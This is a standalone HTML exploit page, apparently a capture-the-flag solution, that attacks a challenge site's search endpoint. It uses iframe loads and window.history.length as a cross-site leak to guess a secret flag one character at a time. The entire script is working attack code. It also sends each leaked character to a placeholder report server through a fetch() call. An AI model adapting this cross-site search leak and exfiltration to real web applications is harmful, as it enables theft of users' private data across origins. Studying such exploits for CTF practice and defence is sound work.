<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <script>
        const URL = "https://lamenote-web.chal.irisc.tf/search?query="
        const alphabet = "_}abcdefghijklmnopqrstuvwxyz"
        const REPORT = "https://your-server-address" // 리포트 서버 주소로 수정 필요

        var FLAG = `${document.location.search.split("?")[1].split("=")[1]}`
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

        (async function(){
            async function leak(url){
                var iframe = document.createElement('iframe')
                iframe.sandbox = "allow-same-origin"
                iframe.csp = "img-src 'none'"
                iframe.src = url
                iframe.onload = () => {
                    setTimeout(() => {
                        iframe.onload = null
                        iframe.src = url
                    }, 100)
                }
                document.body.appendChild(iframe)
                await sleep(2000)
                let lengthHistory = window.history.length;
                return lengthHistory
            }

            var start = await leak(URL + FLAG + "0") 
            for (let y = 0; y < 2; y++) {
                for (var c of alphabet) {
                    var lengthness = await leak(URL + FLAG + c)
                    if (lengthness == start) {
                        FLAG = FLAG + c
                        fetch(`${REPORT}/leaking?len=${lengthness}&char=${c}&flag=${FLAG}`)
                        break
                    }
                    start = lengthness
                }
            }
        })()
    </script>
</body>
</html>
